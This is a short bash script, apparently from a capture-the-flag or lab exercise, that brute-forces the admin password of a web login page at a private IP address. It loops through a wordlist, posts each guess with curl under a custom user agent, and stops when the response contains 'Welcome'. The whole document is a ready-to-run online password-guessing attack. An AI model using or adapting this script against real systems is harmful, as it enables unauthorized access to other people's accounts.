#!/bin/bash

# Note: Bash script to bruteforce the password using rockyou.txt

for pass in $(cat wordlist.txt); do
  echo "Trying $pass"
  response=$(curl -s -A "secretcomputer" -X POST -d "username=admin&password=$pass" http://10.48.167.42/terminal.php?action=login)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found : $pass"
    break
  fi
done
